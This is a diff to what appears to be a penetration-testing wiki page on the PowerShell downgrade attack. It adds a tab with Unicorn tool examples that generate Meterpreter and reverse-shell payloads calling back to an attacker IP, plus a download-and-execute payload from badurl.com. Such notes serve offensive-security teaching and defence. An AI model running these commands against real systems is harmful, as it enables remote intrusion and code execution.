@@ -45,17 +45,39 @@ Most PowerShell sessions will start with the most recent PowerShell engine, but 
 
 {% tabs %}
 {% tab title="Powershell" %}
-We can simply use this command to downgrad powershell. This attacked is used in popular tools such as [Unicorn](https://github.com/trustedsec/unicorn)
+We can simply use this command to downgrad powershell.&#x20;
 
 ```bash
 PowerShell -Version 2
 ```
+{% endtab %}
+
+{% tab title="Unicorn" %}
+[Unicorn](https://github.com/trustedsec/unicorn) is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory.
+
+```bash
+# Syntax:
+# python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
+
+# Examples:
+# Meterpreter
+python unicorn.py windows/meterpreter/reverse_https <ATTACKING_IP> <ATTACKING_PORT>
+
+# Reverse Shell
+python unicorn.py windows/x64/shell_reverse_tcp <ATTACKING_IP> <ATTACKING_PORT>
+
+# Download Exec
+python unicorn.py windows/download_exec url=http://badurl.com/payload.exe
+
+# Custom Powershell script
+python unicorn.py evil.ps1
+```
+{% endtab %}
+{% endtabs %}
 
 {% hint style="danger" %}
 Since this attack is such low-hanging fruit and simple in technique, there are a plethora of ways for the blue team to detect and mitigate this attack.
 {% endhint %}
-{% endtab %}
-{% endtabs %}
 
 ### PowerShell Reflection
 
